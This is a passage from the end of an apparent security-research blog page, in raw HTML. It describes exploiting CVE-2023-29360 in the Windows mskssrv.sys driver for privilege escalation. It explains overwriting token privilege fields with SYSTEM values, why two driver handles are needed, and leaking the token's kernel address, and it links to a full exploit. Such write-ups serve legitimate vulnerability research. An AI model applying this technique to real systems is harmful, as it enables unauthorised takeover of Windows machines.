</span></span><span class="highlight-line"><span class="highlight-line-content">+0x50 EnabledByDefault : Uint8B</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">To escalate privileges via write primitive, we can simply overwrite the fields at offset 0x40, 0x48 and 0x50 with the values that are present in the _TOKEN of system process.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Note : The _TOKEN address obtained via any means should have the last bit set to 0. So simply AND the address with <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">0xfffffffffffffff0</code></p><h3 id="time-wasted-on" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360#time-wasted-on"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_bv8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_bv8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">Time wasted on :-</div></h3><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The below are the pointers where I wasted lot of time on silly mistakes.</p><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'â€¢';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">While reversing, I figured out that we need to execute both <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">InitializeStream</code> and <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">RegisterStream</code> functions but I was not able to execute both the functions on a single driver handle. This lead me to realize that we need 2 driver handles. One driver handle would be responsible for creating <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">InitializeStream</code> and another one would be responsible for creating <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">RegisterStream</code>. If our main driver handle is say <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">driver1_</code> , then InitializeStream needs to be done on handle1_ while RegisterStream needs to be done on driver2_.</p></div></li></ul><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The reason for this is because of a check in ConsumeTx shown below :</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><picture class="relative"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit mx-auto"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FO71YlZMG5Xl9mX77KwIt%252Fimage.png%3Falt%3Dmedia%26token%3D81b0296e-fb35-4d50-8ce0-c5c3b0798b6a&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=b1d054c4&amp;sv=2" width="918" height="218"></div><figcaption class="text-xs text-center text-tint mt-2">Make sure stream is registered</figcaption></picture></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The variable g4 is initialized to 1 only in <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">RegisterStream</code> function in mskssrv driver. As shown below, the driver fetches the stream pointer from a list and sets <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">g4</code> structure member to 1</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><picture class="relative"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit mx-auto"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://seg-fault.gitbook.io/researchs/~gitbook/image?url=https%3A%2F%2F1804885456-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FIo3S6x9y21ea77Yw303B%252Fuploads%252FGhTKPNufPdVoZ6Qaph1e%252Fimage.png%3Falt%3Dmedia%26token%3Da22d4e05-56b7-4f43-a74c-80eca15f9f01&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=be727f7f&amp;sv=2" width="1049" height="509"></div><figcaption class="text-xs text-center text-tint mt-2">Register stream</figcaption></picture></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The reason we were not able to use the same driver handle is because of this check in RegisterStream operation</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_4f8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content"> ...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  if ( CurrentStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode != 0x2F0420<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    || CurrentStackLocation-&gt;FileObject-&gt;FsContext2 )<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">    return STATUS_INVALID_DEVICE_REQUEST;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  ...</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The FsContext2 is set for a IRP that corresponds to a single driver handle. This means that if we create a new driver handle, then <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">FsContext2</code> by default will be null and this check would be passed and hence the need to create a new driver handle.</p><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'â€¢';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Given the read write primitives, I wanted to use less number of read and writes. This means that traversing the eprocess linked list in kernel is not a feasible approach since this would be multiple reads. Reading about few techniques, I found this <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="http://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf">blackhat<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_4rcj8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4rcj8qav5ukqiv5ubsnpfivb_)"></rect></svg></a> paper. </p></div></li></ul><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">I decided to use the <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">OpenProcessToken</code> approach. OpenProcessToken returns a token handle that can be used along with <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NtQuerySystemInformation</code> to obtain the kernel address of the _TOKEN object. I wasted lot of time trying to understand why the Token address returned via above method was not same to the token address obtained via <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">_EPROCESS</code> structure from debugger.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Eventually I realized that I was looking at wrong process. The exploit process would be a child process of cmd.exe and as such we need to find the <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">_EPROCESS</code> of the exploit process rather than cmd.exe and then calculate the value. The Token address returned via _EPROCESS would be same as the one obtained via previous method. A stupid mistake <span class="font-emoji">ðŸ˜„</span></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Full exploit can be found at <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://github.com/0xDivyanshu-new/CVE-2023-29360/">Github<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_9kp8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9kp8qav5ukqiv5ubsnpfivb_)"></rect></svg></a>.</p><h3 id="references" class="text-lg @xs:text-xl @lg:text-2xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[0.75em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-snug" aria-label="Direct link to heading" href="https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mskssrv.sys-cve-2023-29360#references"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_cr8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_cr8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-snug">References :-</div></h3><ul class="min-w-0 space-y-2 mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl page-api-block:ml-0"><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'â€¢';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">BlackHat paper on methods for token based privilge escalation : <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="http://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf">here<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_9mct8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9mct8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'â€¢';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">A awesome blog on the bug by yar-eb <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://big5-sec.github.io/posts/CVE-2023-29360-analysis/">here<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_9mkt8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9mkt8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></p></div></li><li class="leading-normal flex items-start"><div class="text-base leading-normal mr-1 flex min-h-lh min-w-6 items-center justify-center text-tint"><div class="before:font-var before:content-(--pseudoBefore--content)" style="--pseudoBefore--content:'â€¢';--font-family:Arial;font-size:min(1.5em, 24px);line-height:1"></div></div><div class="flex min-w-0 flex-1 flex-col space-y-2"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid min-h-lh [h2]:pt-0 [h3]:pt-0 [h4]:pt-0 mx-0 text-start self-start justify-start">Theori blog for a detailed analysis <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://blog.theori.io/chaining-n-days-to-compromise-all-part-3-windows-driver-lpe-medium-to-system-12f7821d97bb">here<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_9mst8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9mst8qav5ukqiv5ubsnpfivb_)"></rect></svg></a>.</p></div></li></ul><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"></p></div><div class="flex flex-col md:flex-row mt-6 gap-2 max-w-3xl page-width-wide:max-w-screen-2xl mx-auto text-tint"><a class="group text-sm p-2.5 flex gap-4 flex-1 flex-row-reverse items-center pl-4 border border-tint-subtle rounded-sm circular-corners:rounded-2xl straight-corners:rounded-none hover:border-primary text-pretty md:p-4 md:text-base" href="https://seg-fault.gitbook.io/researchs/windows-security-research/exploit-development/mouse-server"><span class="flex flex-col flex-1 text-right"><span class="text-xs">Previous</span><span class="text-tint-strong group-hover:text-primary line-clamp-2">Mouse Server</span></span><svg class="gb-icon hidden size-4 text-tint-subtle contrast-more:text-tint-strong group-hover:text-primary md:block"><title>chevron-left</title><defs><mask id="_R_4qqav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4qqav5ukqiv5ubsnpfivb_)"></rect></svg></a><a class="group text-sm p-2.5 flex gap-4 flex-1 flex-row items-center pr-4 border border-tint-subtle rounded-sm circular-corners:rounded-2xl straight-corners:rounded-none hover:border-primary text-pretty md:p-4 md:text-base" href="https://seg-fault.gitbook.io/researchs/windows-security-research/fuzzing"><span class="flex flex-col flex-1"><span class="text-xs">Next</span><span class="text-tint-strong group-hover:text-primary line-clamp-2">Fuzzing</span></span><svg class="gb-icon hidden size-4 text-tint-subtle contrast-more:text-tint-strong group-hover:text-primary md:block"><title>chevron-right</title><defs><mask id="_R_5aqav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_5aqav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="mx-auto mt-6 page-api-block:ml-0 flex max-w-3xl page-full-width:max-w-screen-2xl flex-row flex-wrap items-center gap-4 text-tint contrast-more:text-tint-strong"><p class="mr-auto text-sm ">Last updated <time data-visual-test="transparent" datetime="2024-09-01T19:23:40.191Z" data-state="closed">1 year ago</time></p></div></main></div></div><!--$--><!--/$--></div></div><!--$--><!--/$--></body></html>